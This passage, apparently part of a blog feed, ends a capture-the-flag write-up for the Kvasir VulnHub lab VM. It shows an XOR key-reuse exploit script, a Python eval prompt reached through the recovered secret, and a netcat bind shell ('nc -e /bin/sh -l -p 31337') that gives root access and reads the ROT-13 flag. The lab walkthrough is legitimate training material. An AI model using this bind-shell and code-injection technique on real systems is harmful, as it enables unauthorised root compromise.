+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">key</span> <span class="n">XOR</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="ow">and</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">message</span> <span class="n">XOR</span> <span class="n">message</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">therefore</span><span class="p">:</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">message</span> <span class="n">XOR</span> <span class="n">key</span> <span class="n">XOR</span> <span class="n">flag</span> <span class="n">XOR</span> <span class="n">key</span> <span class="n">XOR</span> <span class="n">message</span> <span class="o">=</span> <span class="n">flag</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">decoded_flag</span> <span class="o">=</span> <span class="n">xor_strings</span><span class="p">(</span><span class="n">xor_both_result</span><span class="p">,</span> <span class="n">message</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="n">decoded_flag</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Let&rsquo;s exploit it!</p>
+
+<pre><code>kefka@adm:~$ sudo /opt/wep2.py &amp;
+[1] 2824
+kefka@adm:~$ ./exp.py 
+0W6U6vwG4W1V
+</code></pre>
+
+<p>Wow, that was actually <em>really</em> quick (way less than 1s)&hellip; that&rsquo;s our plaintext flag! But is that it? We need a root shell! I tried using it as a root password, but didn&rsquo;t work. Tried few other things, tried to find other privilege escalation points, but no luck.</p>
+
+<p>Finally, I decided to put it in as input in the program we just exploited.</p>
+
+<pre><code>=============================
+Can you retrieve my secret..?
+=============================
+
+Usage:
+'V' to view the encrypted flag
+'E' to encrypt a plaintext string (e.g. 'E AAAA')
+
+0W6U6vwG4W1V
+&gt; ls
+Traceback (most recent call last):
+  File "&lt;string&gt;", line 1, in &lt;module&gt;
+NameError: name 'ls' is not defined
+&gt; print "A"
+A
+</code></pre>
+
+<p>Python shell? Wow, ok, let&rsquo;s create real shell!</p>
+
+<pre><code>&gt; import os; os.system("nc -e /bin/sh -l -p 31337")
+^C
+kefka@adm:~$ nc localhost 31337
+id
+uid=0(root) gid=0(root) groups=0(root)
+cd /root
+ls
+flag
+cat flag
+    _  __                             _            
+   | |/ /   __ __   __ _     ___     (_)      _ _  
+   | ' &lt;    \ I /  / _` |   (_-&lt;     | |     | '_| 
+   |_|\_\   _\_/_  \__,_|   /__/_   _|_|_   _|_|_  
+  _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
+  "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
+
+Pbatenghyngvbaf ba orngvat Xinfve - V ubcr lbh rawblrq
+gur evqr.  Gnxr uvf oybbq, zvk jvgu ubarl naq qevax 
+gur Zrnq bs Cbrgel...
+
+Ovt fubhg bhg gb zl orgn grfgref: @oneeronf naq @GurPbybavny.
+Fcrpvny gunaxf gb Onf sbe uvf cngvrapr qhevat guvf raqrnibhe.
+
+Srry serr gb cvat zr jvgu gubhtugf/pbzzragf ba
+uggc://jv-sh.pb.hx, #IhyaUho VEP be Gjvggre.
+
+  enfgn_zbhfr(@_EnfgnZbhfr)
+</code></pre>
+
+<p>Even the flag is messed up&hellip; ROT-13 :)</p>
+
+<pre><code>cat flag | tr 'n-za-mN-ZA-M' 'a-zA-Z'
+    _  __                             _            
+   | |/ /   __ __   __ _     ___     (_)      _ _  
+   | ' &lt;    \ V /  / _` |   (_-&lt;     | |     | '_| 
+   |_|\_\   _\_/_  \__,_|   /__/_   _|_|_   _|_|_  
+  _|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
+  "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
+
+Congratulations on beating Kvasir - I hope you enjoyed
+the ride.  Take his blood, mix with honey and drink 
+the Mead of Poetry...
+
+Big shout out to my beta testers: @barrebas and @TheColonial.
+Special thanks to Bas for his patience during this endeavour.
+
+Feel free to ping me with thoughts/comments on
+http://wi-fu.co.uk, #VulnHub IRC or Twitter.
+
+  rasta_mouse(@_RastaMouse)
+</code></pre>
+
+<h2>Summary</h2>
+
+<p>Awesome challenge! Spent quite a lot of hours (on and off) working on it, I liked the multi-layered design of it and how it touched on quite a lot of aspects of security! Also I managed to brush up on some of the forensics skills and learnt something new about key reuse :) Great job building it up <a href="https://twitter.com/_RastaMouse">Rasta Mouse</a>!</p>
+
+<p>Oh, also, obligatory network diagram of the whole thing.</p>
+
+<p><img src="/images/posts/2014-11-05-kvasir-vm-writeup/diagram.png" title="Diagram" alt="Diagram" /></p>
+]]></content>
+  </entry>
+  
+</feed>
